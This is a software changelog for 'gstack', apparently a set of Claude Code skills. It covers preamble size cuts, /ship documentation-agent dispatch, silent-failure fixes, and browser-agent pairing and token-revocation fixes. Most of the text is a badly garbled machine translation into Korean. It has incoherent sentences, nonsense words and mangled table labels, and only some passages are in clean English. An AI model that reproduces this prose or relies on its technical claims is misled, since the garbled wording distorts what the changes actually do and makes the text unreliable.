모든 gstack 기술은 모든 일을 하기 전에 고정된 신속한 비용을 지불합니다. 이 릴리스는 모든 62의 기술 및 핀을 통해 비용을 삭감하므로 그들은 다시 크립 할 수 없습니다. 공유된 preamble의 bash는 두 실행 시간 스크립트로 이동 (`bin/gstack-skill-start`, `bin/gstack-skill-end`) 동일한 STATUS 선을 항상 해석합니다. 한 번 온보드 텍스트는 이제 게이트가 실제로 화재가 발생했을 때만 나타납니다. 즉, 모든 세션에서 세션을 통해 세션을 실행합니다. Eleven 더 많은 기술은 섹션을 carve 및 사무실 시간의 기존의 carve가 깊은 곳에서 갔다, 9에서 20까지 carved roster 복용 : 그 요구 사항에 무거운 참조 본체로드, 결코 전에.

### 중요 한 숫자

출처: `bin/gstack-context-bill --diff` 이 branch의 주요 렌더링을 비교하여 소스에서 재생된 두 가지.

| 원장소개 | 의 전 | 후지후 | Δ |
|---|---|---|---|
| /review eager per invocation | 109.5KB (~26.6K 톡) | 53.7KB (~13.0K 톡) | −51% |
| /land-and-deploy eager의 | 109.8KB | 54.4KB | −50% |
| /codex eager의 | 100.0KB의 경우 | 53.9KB | −46% |
| 디스크에 Corpus | 6.4MB (1,651K 톡) | 5.4MB (1,398K 톡) | −15% |
| Repo CLAUDE.md ( dev 세션에서 통로에) | 66.4KB의 | 44.9KB | −32% |

62개의 설치된 기술 중 50개가 떨어졌다 ( 나머지는 no 항목과 no 헛간을 가진 정착물/alias 항목입니다). 가장 작은 진짜 커트는 직업 당 −4,780 토큰입니다 (예를들면 1개). 비 carved tier-2 기술은 각 preamble의 편평한 ~20.8KB를 흘렸습니다. 0 항상 eager 성장은 diff에서 어디에서든지.

이 발송하기 전에 행동 증거 란: A/B eval 핀은 오래된 인라인 렌더링에 대하여 스크립트 렌더링을 핀으로, 단면도 적재 eval는 실제 에이전트가 단계 (20 기술, 데이터 중심)를 하기 전에 각 새겨진 부분을 읽고, 환경 전용 기본으로 통과된 전체 유료 게이트. 모든 파 후의 맥락 래치드를 다시 캡처, 그래서 각 천장은 이제 새로운, 낮은 수에 앉아.

### 너를 위한 이 뜻

이 에이전트는 작업 시작 전에 약 절반 보일러 플레이트를 읽습니다. 그래서 첫 번째 직장 대기 시간과 실행되는 모든 기술에 걸쳐 원탁 비용 드롭. 내장 된 신속한 당신은 이미 다시 렌더링하지 않습니다. 다른 사람은 다른 느낌이 없다 : 기술이 v1.69에서 수행 한 것보다 다르게 작동하면 버그가 있고, A/B 하네스가 붙을 수 있습니다. 업그레이드 후 `bun run test`를 실행하십시오. 당신이 성장했는지 말해.

### 항목화 된 변경

### 추가
- `bin/gstack-skill-start` / `bin/gstack-skill-end`: tier-2+ 기술 당 인라인 bash의 ~18KB 대체하는 전진과 원격 측정 런타임. `SKILL_START_PROTO: 1` 핸드레이크, STATUS 선, 그리고 `GSTACK_INSTRUCTION` 블록으로 1회 온보드를 무작위 suffix와 함께 실행 세션 ID에 바인딩; passthrough 산출은 이렇게 repo 또는 이전 세션 ID 또는 ID 블록을 위해 내용이 막을 수 없습니다.
- `bin/gstack-retro-metrics`: /retro (표본 계약, 로컬 읽기 전용)를 위한 세분화 git metrics, inline git/awk를 기술 몸에 대체합니다.
- 11개의 새로운 기술을 위한 단면도 carves — 검토, 코덱, 땅 및 배치, autoplan, spec, 설정 GBrain, qa, 찾아, retro, 디자인 HTML, 디자인 샷건 — 더 깊은 사무실 시간 carve (단계 2A/2B), 등록한 감시, 선적 대본 및 recomputed 크기 지면과 더불어 각각. 디자인 carves는 디자인 일 시작의 앞에 그들의 UX 교리를 강제 읽었습니다.
- Context-budget ratchet: 무료 CI 테스트는 항상 카탈로그와 각 기술에 대한 원 고용 비용에 대한 헌신적 인 천장; 성장은 스위트, 감소 재 캡처 및 잠금을 실패.
- repo CLAUDE.md (browser internals, CHANGELOG 체재 spec, 프로젝트 나무, 신비한 E2E 주, 슬로프스카 가이드, OpenClaw 간행)에서 6개의 참고 docs 추출물된 verbatim, 각 대체된 인라인 짧은 규칙 플러스 포인터.

### 변경
- AskUserQuestion 도구 해결책과 5+-option 규칙은 echoed STATUS 선에 열쇠가 있는 조밀한 branch 테이블로 만듭니다; 완전하게 설치 경로에 살아있는 가득 차있는 split/CJK 규칙은 수요에 읽었습니다. 모든 14개의 필수 체재 핀은 각 층 2+ 골격에 체재합니다.
- ios-fix, ios-clean, ios-sync 및 ios-design-review는 tier 2 (세로 3 섹션을 사용하지 않는 것은 결코)를 미리 떨어졌다.
- stale installs에서 안전하게 움직여진 preamble degrades: 누락된 handhake는 안전한 과태를 의미하며, (소비자는 결코 잃지 않습니다), 그리고 원라인 업그레이드 힌트를 의미합니다.
- 개인정보 보호정책 게이트와 원격 측정 시그널은 대화형 세션에서만 불을 밝히고 headless는 다음의 인간 세션에 흩어지기 시작합니다.
- 신비한 E2E 아이들은 그들의 자신의 `GSTACK_HOME`에 있는 종결 국가를, 이렇게 evals 결코 점화하지 않습니다 첫번째 뛰기 신속한.

### 고정
- 한 번에 artifacts pull는 이제 비동기적이고 느린 네트워크가 경계를 갖춰, 그래서 hung 리모트는 일의 첫번째 기술 invocation를 넣을 수 없습니다.
- 브랜딩과 artifacts-repo state 파일은 STATUS 출력 및 타임라인 레코드를 입력하기 전에 위생화되어, hostile ref 이름 또는 심층 파일로 로그 포거 경로 닫습니다.
- Skill-start no no gbrain 서버가 등록될 때 각 invocation에 다중 메가바이트 `~/.claude.json`를 더 오래 파냅니다.

### 기여자
- Preamble A/B eval (`skill-e2e-preamble-script-ab`, periodic tier) 핀은 사전 통합 인라인 렌더링에 대한 스크립트 렌더링 동작을 핀으로 합니다. carve-section-loading eval은 솔직한 480s 천장에서 20개의 새겨진 기술을 다룹니다.
- 새로운 무료 테스트 : 기술 - 스타트/skill-end 계약 및 행동 (13), 복고 미터 (11), 온보드 이동 리터 묘비 (3 테스트 핀 12 리터 모두 방향), 컨텍스트 - 버짓 등뼈 (7). 패리티 기본 및 래치드 고정 장치 재 캡처; 수축 바닥은 유지 (OV8 평가).
- `test/helpers/touchfiles-data.ts`: 런타임 스크립트는 이동 발전기로 지정된 모든 dep 리스트에 합류하여, 그래서 딕스 기반 eval 선택은 여전히 스크립트 변경에 불을 붙입니다.

## [1.70.1.0] - 2026-08-26

**모든 결정점에서 문서의 에이전트을 이름을 발송합니다.** **손전등은 이제는 조용히 흘러가는 경우에 실패한 시험에 의해 핀으로 꼿습니다.**

`/ship`는 v0.18.2.0 이후 단계 18으로 `/document-release`를 파견했지만, v1.54.0.0 캐러드는 주문된 섹션으로 단계로 이동하고 항상 로드된 골격은 어떤 결정점 (재런 체크리스트에 묻힌 한 언급)에서 "document-release"라고 말했습니다. 배선은 불행했습니다. 가시성은 사라지며, 아무것도 손이 닿지 않았습니다. 이 릴리스는 그것에 대해 복원하고 잠금을 해제합니다. STOP 포인터, 단계 17 핸오프 라인, 그리고 새로운 호이를 꿴 doc-sync invariant 모든 이름 "the /document-release 에이전트" (목적으로 배열되는, 그래서 에이전트은 약한 인라인 사본을 달리기의 대신 고립된 노동자를 파견합니다). 자유로운 삼각대는 낱말을 붙이고, carve 가드 닻 핀 각 접촉점은 자주적으로, 새로운 문 층 E2E는 실제로 살아있는 에이전트을 창조하기 전에 실제적인 파견합니다.

### 중요 한 숫자

출처: 이 branch의 eval 저장소 (`~/.gstack/projects/<slug>/evals/`, `test/skill-e2e-ship-docsync.test.ts`)와 `wc -c ship/SKILL.md`의 실행.

| Property | 의 전 | 후지후 |
|--------|--------|-------|
| Claude-host 배 워크플로우 바디에 이름을 딴 Doc-sync subagent | 0 결정점에 대한 언급 | 4 (구 인덱스, STOP 포인터, 단계 17 핸오프, 호이 즈음 invariant) |
| ship→document-release handoff를 핀으로 꼿습니다 | none | 5 무료 삼각 테스트 + 3 per-touchpoint 캐러드 앵커 + 1 게이트 E2E |
| 실시간 파견 증거 | 측정하지 않는 | 9/9는 PR 생성하기 전에 파견을 발사합니다 ($0.63-1.04, 234-319s 각각, sonnet-4-6) |
| 항상 적재된 skeleton 비용 | 199,600 원 | 91,764 B (+497 B, 92,300로 자란 모자) |

9가지 라이브 실행 중에는 중요 한 줄이 있습니다. E2E는 실제 도구 통화 스트림에 경고, 서브 에이전트을 인용 하는 전송 별 일치기와 섹션 텍스트를 만족할 수 없습니다, 그리고 그 시간 초과 허용 출구 체크는 결코 파견 assert 자체를 연화 하지.

### gstack 사용자를 위한 이 뜻은 무엇입니까

`/ship`를 실행할 때, docs sync 단계는 no 더 긴 파일에 있는 보이지 않는 선은 과거를 요약할지도 모릅니다. 그것은 정확한 순간에 지명됩니다 에이전트은 무슨을 다음을 하기 위하여 결정하고, 합병 차단 시험은 어떤 미래 편집이 그것을 보이지 않는 경우에 다시 실패합니다. 실패한 docs subagent는 아직도 당신의 배를 막지 않습니다. 구성할 것이다 아무것도. 향상과 배.

### 항목화 된 변경

#### 고정

- `/ship`의 Claude-host skeleton 이름 "모든 3 단계 18 결정점 (부분 색인으로 렌더링되는 만피 트리거 및 STOP 포인터, 단계 17 핸드오프 라인, 그리고 PR-title invariant 옆에 호평을 갖는 doc-sync invariant). invariant는 계약이 일반적으로 주어집니다. 파견 자체는 결코 건너지지 않습니다; 실패한 에이전트은 비 차단되지 않습니다.

#### 추가

- `test/ship-document-release-dispatch.test.ts`: 새겨진 단계 18 계약 (임시, `subagent_type`, JSON 반환 키, 비 차단 절), 세 골격 터치 포인트, invariant-above-STOP 주문, E2E 일치자 4 감적 문자열 및 경사 단계 18 → 단계 19 코덱에서 주문./factory 황금.
- `test/skill-e2e-ship-docsync.test.ts` (`ship-docsync`, 문 층): 살아있는 에이전트은 신비한 git 정착물에 있는 조각 단계 17→19 배 꼬리를 달립니다; 단계 18의 신속한 감적 일치를 일치하는 에이전트이 도구 외주에서 어떤 `gh pr create`의 앞에 나타납니다. 정착물은 단계 표 건조기 편향에 확고하게 실패합니다, 그것의 git branch를 통신수 구성에 대하여, assertserts 각 설치 명령, 그리고 neutralal curdential 질문의 branch 가시합니다.

#### 기여자

- 캐비드 가드 배 입장: 3개의 비 겹쳐 쌓이는 per-touchpoint 닻 (gerund, 불완전한, 제 3 사람: no 닻은 다른, 그래서 각각 자주적으로 강제됩니다), carved, skeleton byte 모자 91,600 → 92,300를 측정한 값으로 체재하기 위하여 새겨진 불완전한 피했습니다.
- `ship-docsync` `E2E_TOUCHFILES` 및 `E2E_TIERS` (게이트)에 등록되어 전체 파일 `describeE2ETier('gate')` 자체 게이트가 diff 선택으로 구성되어 있으므로 파일이 정기적 인 shard 인구 조사에서 유지됩니다. tierless `test:evals` 인접 거래는 파일 헤더에 문서화됩니다.
- 내부 백로 메모는 현재 단계 18 디자인을 설명하기 위해 수정 (예를들면 이전 V1.54 "Step 8.5" prose는 여전히 현재로 문서화되었습니다), 플러스 3 개의 deferred 후속 기록 : 기계 검사 가능한 파견 영수증, 토지 및 배포를위한 동일한 파견 핀 처리, 정기적 인 shard-census 천장 arithmetic.

## [1.69.0.0] - 2026-08-22

**침묵의 파 : 아무것도하지 않고 성공을보고 도구 —** **또는 잘못된 것은 - 이제 그들이 말하는 것을, 또는 그들이 할 수없는 크게 말.**

이 파의 모든 수정은 동일한 실패 모양을 닫습니다. `gstack-evidence` - 도구 다른 도구는 믿는다 - 인증은 CI에서 다른 환경이, bun 자동 로드 된 때문에 repo의 `.env` 파일이 모든 아이에 스파게됩니다. gbrain wireup의 첫 번째 동기화는 뇌의 *default* 소스를 대상으로 한, 이는 gstack의 사용자의 기본 지식 소스를 gstack의 첫 번째 sync를 의미하지만, 여전히 선명한 페이지가 출력되었습니다. `./setup --host slate` 종료 0 아무것도 설치. `land-and-deploy`의 merge 복구는 `--delete-branch` 절반을 제외하고 모든 것을 약속했다, 아무것도 말했다. `_unattributed → deny` ingest 정책은 정확히 페이지에 적용되지 않습니다. 기술 디르 클린 업은 구조적으로 orphans를 찾을 수 없습니다. 그리고 false-green 테스트 고정은 "gbrain 누락 된"케이스가 실제 gbrain 설치와 함께 모든 기계에 실패 할 수 없습니다 의미. 여섯 가지 PR은 새로운 신용을 흡수하고 있습니다; 새로운 신용을 흡수; ~17개의 추적기 항목은 영수증과 닫힙니다.

### 중요 한 숫자

출처: 각 commit에 명명된 회귀 테스트 — 파 ( 영수증 기준) 도중 v1.68.3.0의 찰상 worktree에 FAIL에 각 1개의 확인된, 그리고 PR에서 인용된 살아있는 접두사 조사 플러스.

| Property | 의 전 | 후지후 |
|--------|--------|-------|
| `gstack-evidence run` `.env`/`.env.local`를 가진 repo | 아이는 bun-injected vars를 상속합니다; ledger는 실행 CI를 결코 실행하지 않습니다 | 값 평등 스크럽 (쉘 수출 오버라이드 생존), 이름 전용 경고, `GSTACK_EVIDENCE_KEEP_DOTENV=1` 옵트 아웃. @namtrok (#2652)에 의해 기여 |
| Wireup 첫 번째 동기화 | `sync --repo`는 DEFAULT 근원에 대하여 해결합니다; 그것의 닻을, 등록한 근원 얻 0개의 페이지를, 인쇄합니다 성공이라고 임명할 수 있습니다 | `sync --source <id>`; `--help`- `--repo`+warning fallback로 이전 글브래스를 위한 |
| `./setup --host slate` | 0번 출구가 없어도 설치 | Slate (사용 `--host claude`), 0개의 정보 출구를 설명합니다; 어떤 미래에 의하여 받아들여지는 부유하에 철사 주인 출구 1 확고하게; 수락 명부 ◊ 파견 팔은 시험 핀으로 꼿습니다 |
| 토지 및 배포 merge 복구 | `--delete-branch` 반 침묵으로 떨어졌다 | `ls-remote` 재조합: 이미클린 (idempotent) / 확인-first delete / "couldn't Verified"- 실패한 체크는 깨끗한 branch로 읽지 않습니다. |
| Orphaned 기술 dirs 후 payload 갔다 | cleanup는 payload → 구조상으로 reap 할 수 없습니다 | 대상 스캔, dangling-symlink 인식, 경로 - 세그먼트 입증. @szsunyuan (#2634)에 의해 기여 |
| `gstack-redact install-prepush-hook` bun/Windows에 | EEXIST 충돌 - 압흔 가드가 침묵적으로 부패 | `mkdirpSync` tolerates dir-EEXIST만. @Lockyer228 (#2641); 결정 로그, 증거 및 prepush 건너뛰기로 swept |
| "gbrain 누락" 실제 gbrain와 상자에서 테스트 | 호스트의 gbrain을 보았고 0을 종료했습니다. 버그가 존재하는지 결코 실패 할 수 없습니다. | 신비한 뿌리 소유의 디르 - 전용 PATH + 세터미즘 검사. @SomSamantray에 의해 기여 (#2615) |
| Heredoc 몸 가정 양조 bash 5.2+의 밑에 ≥512B | 아이 deadlocks (macOS 512 바이트 관 완충기) | `BASH_COMPAT=50` 11개의 창 스크립트에서 감시 + repo 넓은 스캐너 ratchet. @BenjaminDSmithy (#2640)에 의해 공헌하는 |
| `_unattributed → deny` `--include-unattributed`의 정책 | 적용되지 않음 - 원시 `""` 필터를 우회 | 저장된 리모트는 frontmatter sentinel 일치합니다; deny/read-only 지금 가사를 조금씩 움직이십시오 |
| gbrain의 ZeroEntropy 조리법에 대한 두뇌 | 침몰은 9월 4일, 2026년 후 침묵하게 죽는다. | 구성 탐지에 와이어 업 경고 (실행); 설정 GBrain + docs 고문 (#2365, GBrain-side 마이그레이션은 열리십시오) |
| make-pdf sibling 검색 해상도 | cwd-dependent (`dirname(argv[0])`는 컴파일된 binaries에서 `.`입니다) | `process.execPath`-기반; 디코이 `browse/` 디렉토리는 결코 이길 수 없습니다 |

### 너를 위한 이 뜻

Evidence verdicts are the run CI would perform — your shell-exported overrides still win, and the scrub tells you (key names only) what it removed. Revoking, cleaning up, and installing now either do the thing or name the thing they couldn't do. If your gbrain is on the dying ZeroEntropy recipe, gstack tells you before September 4 instead of letting search quietly rot. And five contributors' PRs are in this release with their authorship on the commits and their handles below.

### 항목화 된 변경

#### 추가
- `setup`: `--host`의 Zero-dispatch 가드: 설치 팔 오류 없이 `--host` 검증을 전달하는 호스트( 호스트와 유효한 대상 이름을 지정) 대신 0을 구성하지 않고, 크로스 체크 테스트 핀은 `hosts/index.ts`와 각 허용된 호스트를 파견 팔(#2361)로 복사합니다.
- ZeroEntropy 일몰 자문 : 유선에서 실패 개방 구성 탐지, `/setup-gbrain`의 제공 업체 - 회사 경고, `USING_GBRAIN_WITH_GSTACK.md`의 문제 해결 항목 (#2365 - refs; gbrain-side 마이그레이션은 열 수 있습니다).
- `lib/fs-utils.ts` `mkdirpSync` (dir-confirmed EEXIST 포용력) bun-Windows-emulating 전선 정착물과 더불어 `gstack-redact`, `gstack-redact-prepush`, `gstack-decision-log`, `gstack-evidence`에 적용해, #2641. @Lockyer228 (#2641에 의해 공헌하는; #2635를 고치십시오.
- Repo-wide heredoc 스캐너: 이 문서는 512B-64KiB가 없는 트랙된 쉘 스크립트는 무료 제품군을 실패합니다. @BenjaminDSmithy (#2640)에 의해 기여했습니다.

#### 변경
- `land-and-deploy` §4a-postfail MERGED 회복은 리모트 branch (편도: 이미 청결한/확인 첫번째 삭제/가장 끊기지 않을 수 있었습니다)를 재조정하고 침묵하는 (#2656) 대신 outcome를 주의합니다.
- `make-pdf`는 주사 가능한 시험 솔기로 `process.execPath`에서 이진을 찾아서 sibling를 해결합니다; `about:blank`의 절반은 v1.64.0.0 (`browse/src/url-validation.ts` 정확한 매치 허용)에서 이미 고쳐졌습니다.
- `./setup --host slate`는 `--host claude` (`docs/designs/SLATE_HOST.md`, Slate)에 `.claude/skills`를 겸용성 fallback로 읽습니다 (#2361).

#### 고정
- `gstack-evidence` scrubs bun-auto-loaded dotenv vars from the child env by value equality — a shell-exported override with a different value survives, `NODE_ENV=test` semantics mirror bun's, and an unreadable `.env` fails open (test-pinned). Known limitation documented in-code: bun-expanded `${VAR}` values are left in place (fails open). Contributed by @namtrok (#2652; fixes #2624; @harjothkhara's #2630 credited for the parallel diagnosis).
- 첫 번째 동기화는 등록 된 소스 ID를 대상으로하지 않습니다. default 소스 (#2662); 0.18.0 바닥에서 경고를 떨어 뜨리고 있으므로 그라핀을 지원하십시오.
- `cleanup_old_claude_symlinks`는 DESTINATION 기술 dir (포함되는 dangling symlinks)에서 나판을 옮깁니다. bare `*gstack*` substring 대신 경로 세그먼트 검증을 가진. @szsunyuan (#2634; #2204)에 의해 공헌하는.
- `gstack-memory-ingest`는 `_unattributed` 리모트를 저장합니다 그래서 repo 정책은 `--include-unattributed` (#2353)의 밑에 실제로 적용하기 위하여 열쇠가 되었습니다.
- 신비한 gbrain-missing PATH 정착물은 진짜 gbrain 설치를 가진 각 기계에 거짓 녹색을 죽이. @SomSamantray (#2615에 의해 공헌하는; #2255를 고치십시오.

#### 기여자
- 테스트: 8,036 → 8,078 (+42 파의 맞은편; 모든 행동 수정은 v1.68.3.0에 입증 된 빨간색을 수행한다.
- 현재 이 문서 스캐너는 모든 트랙 쉘 스크립트를 문 — 512B–64KiB와 새로운 스크립트는 여기에 입력 본문이 `BASH_COMPAT=50` 가드 (또는 작은/file-based체)가 필요합니다.
- bash 4.3/4.4 (예: Git Bash), `BASH_COMPAT=50`는 비 태풍 `invalid value` stderr 경고를 인쇄합니다; 그 소각은 관 길을 결코 가지고 있지 않습니다, 그래서 감시는 거기 no-op입니다.

## [1.68.3.0] - 2026-08-20

**브라우저 에이전트를 다시 설정하여 액세스가 이제 이전 액세스가 중단됩니다.** **자리, 부흥은 에이전트의 탭을 해방하고, `root`는 예약된 클라이언트 이름입니다.**

쌍의 에이전트를 꽉 꽉 찼습니다. 그것은 없습니다. `POST /pair` 신선한 설정 키를 축소하지만 에이전트의 라이브 세션을 만지지 않는, 그래서 `pair-agent --client codex --restrict read` 이미 연결 된 에이전트에 대하여 (또는 새로운 5 분 키 단순히 만료되지 않는) 원래의 전체 액세스 세션을 왼쪽, `eval` 포함, 최대 24 시간 동안 살아. Revocation also never released tab 소유권, 그래서 에이전트는 이전의 정체 탭에서 다시 쌍의 이름을 부여. `root`는 범위, 도메인, 비율 및 탭 체크가 전액 통화인 `--client root`를 위해 사용되었기 때문에, 그(것)들을 건너뛰는 scoped" token를 minted.

### 중요 한 숫자

출처: /after `BROWSE_HEADLESS_SKIP=1` daemon PR의 성적표와 `browse/test/pair-agent-e2e.test.ts`, `browse/test/token-registry.test.ts`, `browse/test/tab-isolation.test.ts`의 회귀 시험, 이전 릴리스에 실패한 `browse/test/tab-isolation.test.ts`.

| Property | 의 전 | 후지후 |
|--------|--------|-------|
| 좁아서, 에이전트은 reconnected를 갖지 않습니다 | 오래 된 넓은 세션 생활 ~24h | 이전 세션 401s 즉시 |
| 에이전트가 연결하기 전에 재 쌍을 좁은 | stale 넓은 설치 열쇠는 아직도 교환할 수 있습니다 | 넓은 열쇠 죽은, 단지 좁은 열쇠 일 |
| Broaden/refresh 재선중단 | 새로운 열쇠를 따라 오래된 세션 라이저 | 작업 세션 유지, stale 키가 떨어졌다, no 아웃 |
| 쌍의 에이전트을 밝히기 | 탭은 소유; 같은 이름 재 쌍은 그들에게 상속 | 탭 소유권이 릴리즈되었습니다. 자체 전용 액세스 거부 |
| `--client root` | "scoped" token 모든 시행을 우회합니다. | rejected with a named 400 and a CLI fast-fail |

### 너를 위한 이 뜻

Re-pair는 이제 실제 조준 레버입니다. **`--client` 이름**와 소폭 `--restrict`/`--domain`를 가진 에이전트을 재 쌍으로 하고, 이전 회의는 개정되고 그 탭은 즉시 당신이 그것을 실행한, 그래서 오래된 접근은 당신이 에이전트을 다시 연결하기 위하여 기다리는 동안 라이저 할 수 없습니다. 넓히거나 상쾌한 동일한 에이전트은 그 작업 세션을 혼자 나타낸다, 그래서 당신은 에이전트 중간 조직을 물었습니다. 레크리에이션 (또는 좁은 재 쌍) 또한 탭을 열 수 있습니다, 그래서 클라이언트 이름을 재사용 할 수 없습니다 다음 에이전트 누군가 다른 사람의 로그인 페이지. `root` 모두에 클라이언트 이름을 거부 CLI 그리고 daemon.

### 항목화 된 변경

#### 고정
- 클라이언트의 라이브 세션을 중단하고 새로운 키를 축소하기 전에 탭을 해제하는 감소 (`/pair`; 응답은 `superseded`를 나릅니다. 비 감소 재 쌍은 세션을 유지하고 단지 드롭 stale 인벤딩 설정 키를 유지하므로 더 넓은 또는 새로 고침하지 마십시오. 요청된 보조금은 취소되지 않고 라이브 세션을 중단하거나 중단하지 않고 재시작하거나 재시작하는 경우 유효합니다. (`browse/src/server.ts`, `browse/src/token-registry.ts`)
- 에이전트가 이전, 더 넓은 설정 키가 부과되기 전에 발급 된 좁은 재 쌍, 그래서 그것은 no 더 이상 교환 될 수 있습니다. (`browse/src/token-registry.ts`)
- 에이전트가 실행된 탭 소유권을 공개합니다. `DELETE /token`는 공개를 실행하지 않습니다. (token) 그리고 `tabs_released`를 보고하고, 동일한 이름에서 재 쌍을 다시 한 번만 하면 no는 그 탭을 더 읽습니다. no와 재 쌍은 만료된 무기로 나타낸 어떤 탭을 자유롭게 사용할 수 있으므로 신선한 세션은 `browse/src/browser-manager.ts`를 상속할 수 없습니다. `browse/src/server.ts`는 `browse/src/server.ts`를 갖는 것입니다.
- `root`는 token 작가마다 `clientId`로 재출발되어, scoped token는 범위를 우회하는, 도메인, 비율 및 탭 체크를 결코 철수할 수 없습니다; `/pair`와 `/token`는 400명과 CLI를 돌릴 때 `--client root`를 거부합니다. `root` 항목은 `root` (`browse/src/token-registry.ts`)를 기록할 때 뚜렷하게 합니다. `browse/src/token-registry.ts`는 CLI 등록 번호가 재출발될 때 `--client root`를 재출발합니다.

#### 기여자
- 회귀 적용 핀 각 속성: 감소 / 폭 넓은 / 그림자 키 재 쌍 동작과 `grantReducesAccess` 진리 테이블 (경, 도메인 방향, 비율 `0`=unlimited, 탭 정책) `browse/test/pair-agent-e2e.test.ts` 및 `browse/test/token-registry.test.ts`; 탭 다운 릴리즈 및 `browse/test/tab-isolation.test.ts`; 작가, 경로 및 레지스트리 복원에 대한 예약 이름 거부.

## [1.68.2.0] - 2026-08-20

**쌍된 에이전트를 다시 한번 보며 모든 것을 보유, 그리고** **문서화 킬 스위치는 실제: 터널 revoke deletes, 그 후 그것을 증명.**

원격 에이전트가 두 번 이상 깨졌다. `revokeToken`는 에이전트의 이름을 일치시키는 첫 번째 token만 삭제, 그리고 항상 라인에서 연결 retries에 유지되는 지출 설정 키. 그래서 `DELETE /token/<agent>`는 200을 반환하는 동안 라이브 세션은 작동을 유지, 왼쪽 설정 설정 키는 "복합"제 에이전트에 대한 브랜드 새로운 세션을 축소 할 수 있습니다 (키의 5 분 유효성), 그리고 두 번째 DELETE는 다시 200>, 다시 문서가 다시 반환되지 않았다. 한편, 200>는 다시 한 번, 그 사이에 다시 한 번 문서가 다시 한 번에 다시 한 번 존재했다. CLI는 알 수없는 명령으로 daemon로 전달했습니다. 쌍을 이루는 docs는 또한 읽기 + 쓰기 sandbox 세 릴리스를 약속하여 전체 페이지 액세스로 전환 한 후.

### 중요 한 숫자

출처: /after 컬 성적표 PR (각 branch에 daemon)와 `browse/test/token-registry.test.ts` 및 `browse/test/tunnel-revoke-cli.test.ts`에 있는 회귀 시험에 `browse/test/tunnel-revoke-cli.test.ts`에 `BROWSE_HEADLESS_SKIP=1` daemon, 이전 릴리스에 실패한.

| Metric | 의 전 | 후지후 |
|--------|--------|-------|
| DELETE /token를 축축한 설정 키로 | 200, 세션 생존 | 200, 모든 3 토큰 삭제 |
| leftover key를 통해 리커넥트 | 새로운 세션 minted | 401 |
| `$B tunnel revoke <name>` | 알 수없는 명령 'tunnel' | 수정, 다음 /agents에 대해 설명합니다. |
| 두번째 DELETE 동일한 에이전트을 위해 | 200 다시 | 404 |
| 베어 `--restrict` (잊혀진 값) | 침묵 FULL 접근 | 단단한 과실, 1 출구 |
| default 쌍 범위에 Docs | "read+write, no JS" | read+write+admin+meta, 보통 명시된 |

### 너를 위한 이 뜻

Revoke는 수정을 의미합니다: 1개의 명령은 세션과 각 설정 키 삭제, 카운트를 인쇄하고 에이전트가 사라지는 것을 증명하기 위해 에이전트 목록을 다시 읽습니다. `$B tunnel agents`는 모두 페어링, 종료 설정 키 포함. 페어링 docs는 이제 default 접근에 대한 진실을 알려줍니다. `--restrict` (신약한 페이지를 읽을 때), 그리고 `$B stop`는 모든 token를 한 번에 삭제합니다. 범위 태스는 `/pair`에서 몸 과실로 원격 에이전트로 서핑 대신 나쁜 범위를 naming 실패, 범위 목록은 no 더 긴 smuggle을 `control` 범위 수 있습니다.

### 항목화 된 변경

### 추가
- `tunnel revoke <name>` 및 `tunnel agents` CLI subcommands: pre-server (daemon를 부과하여 이에 대하여 부합하기 위하여), 포스트 복사 검증 재읽는, 알 수없는 이름, 불능한 daemons 및 에이전트이 목록으로 된 동안 성공 주장하는 오래된 데몬스를 위한 진실한 출구 코드.
- `GET /agents` 목록은 종료 (네창) 설정 키, 표시 `pending`; 설정 키 토큰은 서버를 결코 떠나지 않습니다. `DELETE /token` 응답은 `tokens_deleted`와 daemon가 카운트를 로그합니다.

### 변경
- CLI는 항상 명시된 범위 목록을 보냅니다; 둘 다 CLI와 서버 참조는 소스 삼각에 의해 핀으로 꼿는 `DEFAULT_PAIR_SCOPES`를, 기본적으로 다시 출발할 수 없습니다.
- 범위에 403 힌트는 `--restrict` 또는 `--control` 없이 재선을 추천한다; 그것은 no 더 긴 것 `--admin`를, 위에 과립된 브라우저 통제를 건의한다.
- 페어 에이전트/SKILL.md, REMOTE_BROWSER_ACCESS.md, ARCHITECTURE.md 문서 실제 default, `--restrict`, 그리고 터널 allowlist nuance (`eval`는 리모트로 작동했습니다; `js`/`cookies`/`storage`는 local-only입니다. 결코 간단하게 하는 `tunnel rotate`는 `$B stop`에 의해 대체되고, 팬텀 `storage`는 `/sidebar-chat` 터널입니다.

### 고정
- `revokeToken` 클라이언트 ID를 위한 ALL 토큰을 삭제합니다: 세션 플러스 보류 및 종료 설정 키. false-200의 revoke와 재 과립 구멍에 닫습니다.
- Bare `--restrict` (또는 `--restrict`는 다음 플래그를 삼키는) 과실 대신에 완전히 접근을 보조; `--restrict`는 `control`를 결코 부여할 수 없습니다.
- 범위와 rateLimit 태아는 `/pair`와 `/token`에서 이름을 붙인 필드로 재출발합니다. `rateLimit: 0` (무제한) /pair 경로가 살아 있습니다.
- `DELETE /token/:id` 디코딩 퍼센트 인코딩 클라이언트 에이즈, 그래서 CLI에서 공백 라운드 트랙과 이름을.

### 기여자
- 35개의 새로운 시험 케이스: 개정 회귀 모양, subprocess CLI stub daemons를 가진 마구는 lying daemon에 버전 skew 그물 (" 재발 불완전한"를 핀으로 꼿습니다 각 CLI 과실 branch, e2e 범위 contract 및 403-hint 핀 및 `DEFAULT_PAIR_SCOPES` 및 디코드 경로에 대한 코드 모양 삼각대를 핀으로 꼿습니다.

## [1.68.1.0] - 2026-08-18

**Phantom 후크 오류가 죽었다. 당신의 settings.json 이제 치유 자체** **각 설정에서 no ephemeral 경로가 다시 구워질 수 있습니다.**

당신은 도체 작업 공간 또는 git worktrees에서 작동하면, 아마 본: `PostToolUse:AskUserQuestion hook error ... No such file or directory` 모든 질문에 대한 분사, 당신이 지난 주 삭제 작업 공간에 지적. 원인은 세 부분 실패이었다. 설정은 실행 나무의 물리적 경로로 세계 `~/.claude/settings.json`, 도체 자동 채택에서 정확한 플래그 `bin/dev-setup`는 그것을 방지하기 위해 통과, 그리고 dedupe 태그 gstack는 Claude Code 자체로 줄무늬를 얻을, 그래서 모든 새로운 작업 공간은 이전 하나를 대체 대신 신선한 죽은 항목을 부과.

